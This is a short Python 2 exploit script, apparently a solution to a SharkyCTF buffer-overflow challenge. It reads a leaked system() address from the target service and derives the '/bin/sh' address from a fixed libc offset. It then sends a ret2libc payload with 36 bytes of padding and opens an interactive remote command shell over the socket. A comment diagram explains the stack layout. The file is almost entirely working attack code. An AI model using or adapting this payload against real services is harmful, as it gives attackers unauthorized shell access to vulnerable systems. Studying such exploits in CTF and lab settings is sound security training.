#!/usr/bin/env python

import socket,sys


'''
```
21   *           dummy bytes      dummy bytes     arg0     arg1 for system()
22   *           /                 /			   /			/
23   * |------------------|---------|------------|------|------------------|
24   * | buffer_fill_up   |  AAAA   |  &system   | BBBB |addr of "/bin/sh" |
25   * |------------------|---------|------------|------|------------------|
26   *     buffer      saved-EBP      RET
27   *
28   *
```

'''


offset = 36

s=socket.socket()
# sharkyctf.xyz
s.connect((sys.argv[1],20334))

sysaddr = s.recv(1024).split(': ')[1].lstrip('0x').strip()

print "system:", sysaddr

sysaddr = sysaddr.decode('hex')[::-1]

# print sysaddr.encode('hex')

libc_diff = 1326550 + 5 - 12033 - 11 # ->/bin/sh

'''
system: f7e16200
binsh: 0xf7f59fd2
ready?
cmd $ //////////bin/ls
sh: 1: roadcast: not found

'''

binsh = hex(int(sysaddr[::-1].encode('hex'), 16) + libc_diff)

print "binsh:", binsh

binsh = binsh[2::].decode('hex')[::-1]


raw_input("ready? ")

dummy = 'CCCC'

s.send("A" * offset + sysaddr + "bbbb" + binsh) #offset 36, correct.
# print s.recv(1024)
while 1:
	# s.send("\n")
	s.send(raw_input("cmd $ ")+"\n")
	print s.recv(1024)



